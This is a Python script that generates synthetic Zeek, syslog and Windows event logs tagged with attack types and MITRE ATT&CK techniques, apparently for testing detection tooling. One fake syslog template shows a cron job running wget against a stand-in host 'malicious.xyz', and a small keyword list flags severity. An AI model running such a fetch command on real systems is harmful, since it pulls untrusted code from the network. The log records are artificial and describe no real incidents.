# log_generator.py
import random
import json
from datetime import datetime, timedelta
from faker import Faker

fake = Faker()

ATTACK_TYPES = [
    {"type": "ssh_bruteforce",    "port": 22,  "protocol": "TCP", "tactic": "credential_access",  "technique": "T1110"},
    {"type": "port_scan",         "port": 0,   "protocol": "TCP", "tactic": "discovery",           "technique": "T1046"},
    {"type": "lateral_movement",  "port": 445, "protocol": "SMB", "tactic": "lateral_movement",    "technique": "T1021"},
    {"type": "c2_beacon",         "port": 80,  "protocol": "HTTP","tactic": "command_and_control", "technique": "T1071"},
    {"type": "data_exfiltration", "port": 443, "protocol": "HTTPS","tactic": "exfiltration",       "technique": "T1048"},
    {"type": "normal_traffic",    "port": 443, "protocol": "HTTPS","tactic": "none",               "technique": "none"},
]

INTERNAL_IPS = [f"10.0.{random.randint(0,3)}.{random.randint(1,254)}" for _ in range(20)]
EXTERNAL_IPS = [fake.ipv4_public() for _ in range(30)]

def generate_zeek_log():
    attack = random.choices(ATTACK_TYPES, weights=[10,8,6,5,4,60])[0]
    src = random.choice(EXTERNAL_IPS if attack["type"] != "lateral_movement" else INTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    ts  = (datetime.now() - timedelta(seconds=random.randint(0, 3600))).isoformat()
    return {
        "source":    "zeek",
        "timestamp": ts,
        "src_ip":    src,
        "dst_ip":    dst,
        "dst_port":  attack["port"] if attack["port"] != 0 else random.randint(1, 65535),
        "protocol":  attack["protocol"],
        "bytes_sent": random.randint(64, 50000),
        "attack_type":  attack["type"],
        "tactic":       attack["tactic"],
        "technique":    attack["technique"],
        "severity":  "high" if attack["type"] != "normal_traffic" else "low",
    }

def generate_syslog():
    messages = [
        "Failed password for root from {ip} port {port} ssh2",
        "Accepted password for admin from {ip} port {port} ssh2",
        "sudo: {user}: command not found",
        "kernel: iptables: DROP IN=eth0 SRC={ip}",
        "CRON[1234]: ({user}) CMD (/usr/bin/wget http://malicious.xyz)",
        "systemd: Started suspicious service at {ip}",
    ]
    ip   = random.choice(EXTERNAL_IPS)
    port = random.randint(1024, 65535)
    user = fake.user_name()
    msg  = random.choice(messages).format(ip=ip, port=port, user=user)
    return {
        "source":    "syslog",
        "timestamp": (datetime.now() - timedelta(seconds=random.randint(0, 1800))).isoformat(),
        "host":      fake.hostname(),
        "message":   msg,
        "severity":  "high" if any(x in msg for x in ["DROP","malicious","sudo","Failed"]) else "low",
    }

def generate_windows_event():
    event_ids = {
        4625: ("Failed logon attempt",      "credential_access", "high"),
        4624: ("Successful logon",          "none",              "low"),
        4648: ("Logon with explicit creds", "credential_access", "medium"),
        4776: ("NTLM auth attempt",         "credential_access", "medium"),
        7045: ("New service installed",     "persistence",       "high"),
        4688: ("New process created",       "execution",         "medium"),
    }
    eid, (desc, tactic, sev) = random.choice(list(event_ids.items()))
    return {
        "source":     "windows_event",
        "timestamp":  (datetime.now() - timedelta(seconds=random.randint(0, 900))).isoformat(),
        "event_id":   eid,
        "description": desc,
        "user":       fake.user_name(),
        "host":       fake.hostname(),
        "src_ip":     random.choice(EXTERNAL_IPS),
        "tactic":     tactic,
        "severity":   sev,
    }

def generate_batch(n=100):
    logs = []
    for _ in range(n):
        choice = random.choices(["zeek","syslog","windows"], weights=[50,30,20])[0]
        if choice == "zeek":
            logs.append(generate_zeek_log())
        elif choice == "syslog":
            logs.append(generate_syslog())
        else:
            logs.append(generate_windows_event())
    return logs

if __name__ == "__main__":
    batch = generate_batch(200)
    with open("sample_logs.json", "w") as f:
        json.dump(batch, f, indent=2)
    print(f"[+] Generated {len(batch)} logs → sample_logs.json")